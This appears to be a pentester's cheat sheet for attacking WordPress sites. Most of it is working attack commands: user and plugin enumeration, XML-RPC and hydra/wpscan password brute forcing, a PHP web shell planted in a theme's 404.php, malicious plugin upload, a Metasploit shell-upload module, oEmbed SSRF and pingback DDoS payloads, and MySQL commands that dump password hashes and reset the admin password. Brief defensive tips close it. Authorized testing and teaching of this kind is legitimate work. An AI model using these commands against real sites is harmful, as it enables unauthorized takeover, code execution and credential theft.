# üåÄ WordPress Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After discovering a WordPress site (usually on ports 80/443), I realistically expect to:

- [ ] Identify installed WordPress version, plugins, and themes
- [ ] Enumerate valid users
- [ ] Exploit weak passwords (XML-RPC, login forms)
- [ ] Find RCE via plugin/theme file edit or upload
- [ ] Abuse XML-RPC for SSRF, brute force, or DDoS
- [ ] Post-exploit: extract hashes, change admin password
- [ ] Look for SSRF via oEmbed or pingback
- [ ] Get shell via plugin or theme injection

---

## ‚úÖ WordPress Pentest Checklist

- [ ] **Check robots.txt**
  ```
  curl -s http://<site>/robots.txt
  ```

- [ ] **WordPress Version**
  ```
  curl -s http://<site>/license.txt
  curl -s http://<site>/readme.html
  curl -s http://<site> | grep -Ei 'WordPress|ver='
  ```

- [ ] **Theme & Plugin Enumeration**
  ```
  curl -s http://<site> | grep 'wp-content/themes/' | cut -d '"' -f2
  curl -s http://<site> | grep 'wp-content/plugins/' | cut -d '"' -f2
  curl -s http://<site> | grep '?ver=' | cut -d '"' -f2
  ```

- [ ] **User Enumeration**
  - ID Brute:
    ```
    curl -I http://<site>/?author=1
    ```
  - wp-json API:
    ```
    curl http://<site>/wp-json/wp/v2/users
    ```

- [ ] **XML-RPC Brute Force**
  - Check if enabled:
    ```
    curl http://<site>/xmlrpc.php
    ```
  - Brute single user:
    ```xml
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value>admin</value></param>
        <param><value>password</value></param>
      </params>
    </methodCall>
    ```
  - Use system.multicall for fast bruteforce

- [ ] **Login Brute Force**
  ```
  wpscan --url http://<site> -U admin -P rockyou.txt --password-attack xmlrpc
  ```

  ```
  hydra -L users.txt -p admin <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&...:Invalid Username"
  hydra -l admin -P rockyou.txt <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&...:password you entered"
  ```

---

## ‚úÖ Remote Code Execution (RCE)

- [ ] **Theme File Edit (Admin Panel)**
  - Inject payload in `/wp-content/themes/<theme>/404.php`:
    ```php
    <?php system($_GET[0]); ?>
    ```
  - Trigger:
    ```
    curl http://<site>/wp-content/themes/<theme>/404.php?0=id
    ```

- [ ] **Upload Malicious Plugin (Admin Panel)**
  - Zip your PHP shell plugin
  - Upload via: Dashboard > Plugins > Add New > Upload Plugin
  - Activate & trigger via `/wp-content/uploads/...`

- [ ] **Metasploit**
  ```
  use exploit/unix/webapp/wp_admin_shell_upload
  set RHOSTS <IP>
  set USERNAME <admin>
  set PASSWORD <pass>
  run
  ```

---

## ‚úÖ SSRF & DDoS Checks

- [ ] **oEmbed SSRF**
  ```
  curl "http://<site>/wp-json/oembed/1.0/proxy?url=http://<your-host>"
  ```

- [ ] **Pingback DDoS / Port Scan**
  ```xml
  <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
      <param><value><string>http://target:port</string></value></param>
      <param><value><string>http://<site>/valid-post</string></value></param>
    </params>
  </methodCall>
  ```

---

## ‚úÖ Post-Exploitation

- [ ] **Dump WP Users**
  ```
  mysql -u root -p -e "use wordpress; select user_login, user_pass from wp_users;"
  ```

- [ ] **Change Admin Password**
  ```
  mysql -u root -p -e "use wordpress; update wp_users set user_pass=MD5('hacked') where ID=1;"
  ```

---

## ‚úÖ Recommended Tools

- `wpscan` ‚Üí full enum + brute force
- `hydra` ‚Üí brute login form
- `cmsmap` ‚Üí auto scan & attack
- `Metasploit` ‚Üí plugin/theme RCE modules

---

## ‚úÖ WordPress Security Tips (Defensive)

- [ ] Enable auto-updates:
  ```php
  define('WP_AUTO_UPDATE_CORE', true);
  add_filter('auto_update_plugin', '__return_true');
  add_filter('auto_update_theme', '__return_true');
  ```

- [ ] Use security plugins:
  - Wordfence, Sucuri, iThemes

- [ ] Best practices:
  - Remove default admin
  - Strong passwords + 2FA
  - Restrict `/wp-admin` access
  - Limit login attempts
  - Regularly review user roles
